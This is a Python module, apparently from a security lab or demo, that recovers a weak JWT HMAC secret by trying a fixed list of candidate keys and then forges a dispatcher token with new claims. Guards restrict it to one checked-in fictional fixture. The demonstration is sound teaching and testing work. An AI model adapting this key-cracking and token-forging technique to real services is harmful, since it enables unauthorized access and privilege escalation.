from __future__ import annotations

import base64
import hashlib
import hmac
import secrets
from dataclasses import dataclass

import jwt

from claimjumper.bounded_fixtures import (
    FICTIONAL_CANDIDATES,
    FIXED_FORGED_DISPATCHER_CLAIMS,
    FIXED_FORGED_DISPATCHER_TOKEN,
    FIXED_VULNERABLE_COURIER_TOKEN,
)


class RecoveryBoundaryError(Exception):
    def __init__(self, message: str, *, attempted_candidates: int = 0) -> None:
        super().__init__(message)
        self.attempted_candidates = attempted_candidates


@dataclass(frozen=True)
class RecoveryResult:
    candidate_count: int
    fictional_match: str
    forged_dispatcher_token: str


def _wipe(value: bytearray) -> None:
    value[:] = b"\x00" * len(value)


def _signature_matches(compact_token: str, candidate: bytearray) -> bool:
    try:
        header, payload, encoded_signature = compact_token.split(".")
    except ValueError as exc:
        raise RecoveryBoundaryError("fixed fixture token is malformed") from exc
    signed = f"{header}.{payload}".encode("ascii")
    calculated = hmac.new(candidate, signed, hashlib.sha256).digest()
    expected = base64.urlsafe_b64encode(calculated).rstrip(b"=").decode("ascii")
    return secrets.compare_digest(expected, encoded_signature)


def _find_fixed_list_match(compact_token: str) -> tuple[str | None, bytearray | None]:
    matched_label: str | None = None
    matched_key: bytearray | None = None
    for candidate_text in FICTIONAL_CANDIDATES:
        candidate = bytearray(candidate_text.encode())
        try:
            if _signature_matches(compact_token, candidate):
                if matched_key is not None:
                    _wipe(matched_key)
                    raise RecoveryBoundaryError("fixed fixture has more than one match")
                matched_label = candidate_text
                matched_key = bytearray(candidate)
        finally:
            _wipe(candidate)
    return matched_label, matched_key


def recover_fixed_vulnerable_fixture(observed_token: str) -> RecoveryResult:
    if not secrets.compare_digest(observed_token, FIXED_VULNERABLE_COURIER_TOKEN):
        raise RecoveryBoundaryError("only the checked-in fictional courier token is accepted")

    matched_label, matched_key = _find_fixed_list_match(observed_token)
    if matched_label is None or matched_key is None:
        raise RecoveryBoundaryError(
            "fixed fictional key was not found",
            attempted_candidates=len(FICTIONAL_CANDIDATES),
        )
    try:
        forged = jwt.encode(
            FIXED_FORGED_DISPATCHER_CLAIMS,
            bytes(matched_key),
            algorithm="HS256",
        )
        if not secrets.compare_digest(forged, FIXED_FORGED_DISPATCHER_TOKEN):
            raise RecoveryBoundaryError(
                "derived token did not match the fixed local fixture",
                attempted_candidates=len(FICTIONAL_CANDIDATES),
            )
        return RecoveryResult(
            candidate_count=len(FICTIONAL_CANDIDATES),
            fictional_match=f"{matched_label} (FICTIONAL LOCAL DEMO)",
            forged_dispatcher_token=forged,
        )
    finally:
        _wipe(matched_key)


def fixed_list_has_no_match_for_secure_fixture(secure_token: str) -> bool:
    matched_label, matched_key = _find_fixed_list_match(secure_token)
    if matched_key is not None:
        _wipe(matched_key)
    return matched_label is None
